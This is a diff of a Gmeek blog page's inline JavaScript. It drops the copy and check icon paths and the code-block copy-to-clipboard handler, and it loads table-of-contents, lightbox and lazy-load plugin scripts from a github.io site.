-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -358,70 +371,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
